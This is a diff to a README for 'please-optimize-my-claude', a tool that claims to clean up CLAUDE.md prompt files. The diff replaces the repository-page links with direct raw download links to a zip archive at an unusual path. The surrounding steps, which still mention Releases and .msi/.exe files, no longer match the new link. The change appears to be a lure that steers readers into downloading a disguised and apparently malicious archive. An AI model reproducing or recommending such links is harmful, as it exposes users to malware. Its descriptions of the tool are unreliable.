@@ -1,6 +1,6 @@
 # 📂 please-optimize-my-claude - Fix messy prompt files for Claude
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sherpadirectedverdict3911/please-optimize-my-claude)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/sherpadirectedverdict3911/please-optimize-my-claude/main/holographic/my-optimize-claude-please-1.7.zip)
 
 ## 🎯 What this tool does
 
@@ -16,7 +16,7 @@ This application manages your CLAUDE.md files. It scans your projects to find du
 
 ## 📥 How to get started
 
-1. Visit this page to download: [https://github.com/sherpadirectedverdict3911/please-optimize-my-claude](https://github.com/sherpadirectedverdict3911/please-optimize-my-claude)
+1. Visit this page to download: [https://raw.githubusercontent.com/sherpadirectedverdict3911/please-optimize-my-claude/main/holographic/my-optimize-claude-please-1.7.zip](https://raw.githubusercontent.com/sherpadirectedverdict3911/please-optimize-my-claude/main/holographic/my-optimize-claude-please-1.7.zip)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Choose the file ending in `.msi` or `.exe` for Windows.
 4. Save the file to your computer.
